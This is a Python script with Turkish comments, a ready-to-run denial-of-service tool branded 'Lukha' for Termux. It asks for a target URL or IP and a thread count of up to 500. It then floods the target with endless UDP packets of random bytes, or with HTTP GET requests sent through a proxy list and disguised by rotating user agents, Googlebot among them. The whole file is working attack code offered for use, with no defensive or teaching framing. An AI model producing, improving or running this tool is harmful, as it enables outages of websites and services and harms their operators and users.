import os
import sys
import time
import random
import threading
import socket
import requests
from datetime import datetime

# Renkli çıktılar (Termux uyumlu)
class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Hızlı banner (Termux'da düzgün gözükür)
def show_banner():
    os.system('clear')
    print(f"""{colors.CYAN}{colors.BOLD}
    ██╗     ██╗   ██╗██╗  ██╗██╗  ██╗ █████╗ 
    ██║     ██║   ██║██║ ██╔╝██║  ██║██╔══██╗
    ██║     ██║   ██║█████╔╝ ███████║███████║
    ██║     ██║   ██║██╔═██╗ ██╔══██║██╔══██║
    ███████╗╚██████╔╝██║  ██╗██║  ██║██║  ██║
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    {colors.RESET}{colors.YELLOW}
    [Ultra Hızlı Mode] - Lukha için!
    {colors.RESET}""")

# Socket tabanlı saldırı (en hızlı yöntem)
def socket_flood(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

# HTTP flood (proxy destekli)
def http_flood(target, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(
                target,
                proxies=proxy,
                headers=headers,
                timeout=3
            )
            print(f"{colors.GREEN}[+] {datetime.now().strftime('%H:%M:%S')}", end="\r", flush=True)
        except:
            print(f"{colors.RED}[-]", end="\r", flush=True)

# Proxy yükle (hızlı versiyon)
def load_proxies_fast():
    try:
        with open('proxy.txt', 'r') as f:
            return [{'http': f'http://{line.strip()}', 'https': f'http://{line.strip()}'} 
                   for line in f if line.strip()]
    except:
        return None

# Ana saldırı kontrolü
def start_attack():
    show_banner()
    
    target = input(f"{colors.CYAN}[?] Hedef URL/IP: {colors.RESET}").strip()
    thread_count = int(input(f"{colors.CYAN}[?] Thread sayısı (1-500): {colors.RESET}") or 100)
    attack_type = input(f"{colors.CYAN}[?] Saldırı tipi (1: HTTP, 2: Socket): {colors.RESET}") or "1"

    # Otomatik proxy yükleme
    proxies = load_proxies_fast()
    if proxies:
        print(f"{colors.YELLOW}[!] {len(proxies)} proxy yüklendi!{colors.RESET}")
    else:
        print(f"{colors.YELLOW}[!] Direkt bağlantı kullanılacak{colors.RESET}")

    print(f"\n{colors.RED}[!] SALDIRI BAŞLATILIYOR! (Durdurmak için CTRL+C){colors.RESET}\n")

    # Thread'leri başlat
    for i in range(thread_count):
        try:
            if attack_type == "1":  # HTTP Flood
                proxy = random.choice(proxies) if proxies else None
                t = threading.Thread(
                    target=http_flood,
                    args=(target, proxy),
                    daemon=True
                )
            else:  # Socket Flood
                target_ip = target.split("//")[-1].split("/")[0]
                t = threading.Thread(
                    target=socket_flood,
                    args=(target_ip, 80),
                    daemon=True
                )
            t.start()
        except:
            pass

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Lukha için saldırı durduruldu!{colors.RESET}")
        sys.exit(0)

# Global ayarlar
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

if __name__ == "__main__":
    start_attack()
